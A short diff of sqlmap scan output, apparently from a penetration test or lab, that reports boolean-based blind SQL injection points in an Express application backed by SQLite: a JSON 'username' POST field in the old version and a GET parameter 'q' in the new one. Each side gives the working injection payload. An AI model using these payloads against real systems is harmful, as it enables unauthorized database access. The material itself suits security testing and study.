@@ -1,9 +1,9 @@
-sqlmap identified the following injection point(s) with a total of 456 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 455 HTTP(s) requests:
 ---
-Parameter: JSON username ((custom) POST)
+Parameter: q (GET)
     Type: boolean-based blind
     Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
-    Payload: {"username":"' AND CASE WHEN 3415=3415 THEN 3415 ELSE JSON(CHAR(90,77,70,88)) END-- FgYO","password":""}
+    Payload: q=test' AND CASE WHEN 4994=4994 THEN 4994 ELSE JSON(CHAR(67,71,69,68)) END-- cqdb
 ---
 web application technology: Express
 back-end DBMS: SQLite
